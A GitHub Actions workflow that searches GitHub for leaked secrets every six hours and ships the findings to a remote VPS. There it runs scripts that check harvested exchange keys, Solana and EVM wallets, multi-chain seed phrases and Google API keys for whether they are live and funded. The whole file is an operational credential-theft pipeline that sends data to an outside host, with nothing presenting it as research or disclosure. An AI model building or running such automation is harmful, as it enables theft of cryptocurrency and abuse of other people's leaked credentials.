name: gh-dork

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

permissions:
  contents: read

jobs:
  dork:
    runs-on: ubuntu-latest
    timeout-minutes: 180
    steps:
      - uses: actions/checkout@v4

      - name: fetch seen list from vps
        env:
          VPS_KEY: ${{ secrets.VPS_KEY }}
          VPS_HOST: ${{ secrets.VPS_HOST }}
        run: |
          mkdir -p ~/.ssh
          echo "$VPS_KEY" > ~/.ssh/vps_key
          chmod 600 ~/.ssh/vps_key
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key root@$VPS_HOST:/opt/agents/gh_findings/seen.txt seen.txt 2>/dev/null || touch seen.txt
          echo "Seen count: $(wc -l < seen.txt)"

      - name: run dork scanner
        env:
          GH_TOKEN: ${{ secrets.d1ddyk0ng }}
        run: python3 scripts/gh_dork.py

      - name: ship to vps + verify all exchange keys
        env:
          VPS_KEY: ${{ secrets.VPS_KEY }}
          VPS_HOST: ${{ secrets.VPS_HOST }}
          GH_TOKEN: ${{ secrets.d1ddyk0ng }}
        run: |
          if [ -z "$VPS_KEY" ] || [ -z "$VPS_HOST" ]; then echo "no vps secrets, skipping"; exit 0; fi
          HITS=$(wc -l < gh_findings.jsonl 2>/dev/null || echo 0)
          echo "Hits this run: $HITS"
          STAMP=$(date +%s)
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key gh_findings.jsonl root@$VPS_HOST:/opt/agents/gh_findings/${STAMP}.jsonl
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key seen.txt root@$VPS_HOST:/opt/agents/gh_findings/seen.txt
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key check_exchange.py root@$VPS_HOST:/opt/agents/check_exchange.py
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key check_solana.py root@$VPS_HOST:/opt/agents/check_solana.py
          echo "Shipped $HITS findings + updated seen list"
          echo "--- Running exchange key verification ---"
          ssh -o StrictHostKeyChecking=no -i ~/.ssh/vps_key root@$VPS_HOST "GH_TOKEN='$GH_TOKEN' python3 /opt/agents/check_exchange.py" || true
          echo "--- Running Solana wallet check ---"
          ssh -o StrictHostKeyChecking=no -i ~/.ssh/vps_key root@$VPS_HOST "python3 /opt/agents/check_solana.py" || true
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key check_evm.py root@$VPS_HOST:/opt/agents/check_evm.py
          echo "--- Running EVM balance check ---"
          ssh -o StrictHostKeyChecking=no -i ~/.ssh/vps_key root@$VPS_HOST "python3 /opt/agents/check_evm.py 2>&1 | grep -E '(FUNDED|dust|RPC_ERR|Checked)'" || true
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key check_mnemonics.py root@$VPS_HOST:/opt/agents/check_mnemonics.py
          echo "--- Running multi-chain mnemonic check (ETH/BSC/MATIC/TRX/SOL) ---"
          ssh -o StrictHostKeyChecking=no -i ~/.ssh/vps_key root@$VPS_HOST "timeout 1200 python3 /opt/agents/check_mnemonics.py 2>&1 | grep -E '(MNEMONIC|FUNDED|\*\*\*|Unique|Re-fetching)'" || true
          scp -o StrictHostKeyChecking=no -i ~/.ssh/vps_key check_google.py root@$VPS_HOST:/opt/agents/check_google.py
          echo "--- Running Google API key check ---"
          ssh -o StrictHostKeyChecking=no -i ~/.ssh/vps_key root@$VPS_HOST "timeout 600 python3 /opt/agents/check_google.py 2>&1 | grep -E '(LIVE|Checked)'" || true
